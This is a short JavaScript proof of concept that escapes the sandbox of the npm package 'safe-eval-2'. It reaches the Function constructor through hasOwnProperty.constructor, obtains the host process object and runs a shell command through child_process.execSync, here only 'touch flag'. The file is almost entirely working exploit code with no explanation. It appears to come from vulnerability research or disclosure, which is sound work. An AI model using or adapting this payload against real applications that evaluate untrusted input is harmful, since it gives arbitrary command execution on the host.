var safeEval = require('safe-eval-2')

let code = `
(function () {
    let ret = hasOwnProperty;
    ret.constructor('return process')().mainModule.require('child_process').execSync('touch flag');
}());
`
safeEval(code);
